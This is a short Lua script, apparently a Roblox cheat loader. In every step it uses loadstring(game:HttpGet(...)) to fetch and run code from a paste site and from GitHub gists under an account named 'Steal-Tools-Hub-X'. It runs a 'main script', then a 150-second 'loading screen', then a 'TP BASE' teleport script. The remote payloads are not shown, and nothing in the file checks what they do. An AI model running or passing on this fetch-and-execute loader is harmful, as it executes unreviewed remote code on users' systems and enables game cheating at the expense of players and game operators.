-- // STEP 1: Run the main script first
local success1, err1 = pcall(function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PU4JS6ZUBYtaOmgx/raw"))()
end)

if not success1 then
    warn("Error running main script:", err1)
end

-- // STEP 2: Wait a short moment before showing the loading screen
task.wait(1)

-- // STEP 3: Run the loading screen (150 seconds)
local success2, err2 = pcall(function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Steal-Tools-Hub-X/3d6751925ac6b646ea9751e25a6f31db/raw/5beafb3e9073c215d90907196d9a24aa35b0a36f/tools%2520load.lua", true))()
end)

if not success2 then
    warn("Error loading screen:", err2)
end

-- // Wait for loading screen to finish (150 seconds)
task.wait(150)

-- // STEP 4: Run the TP BASE LUA
local success3, err3 = pcall(function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Steal-Tools-Hub-X/8f15003a2e881ffccb87c91258718953/raw/5ff957293edb31837157b339934d781a177a3096/TP-SAB-BASE", true))()
end)

if not success3 then
    warn("Error running TP Base script:", err3)
end
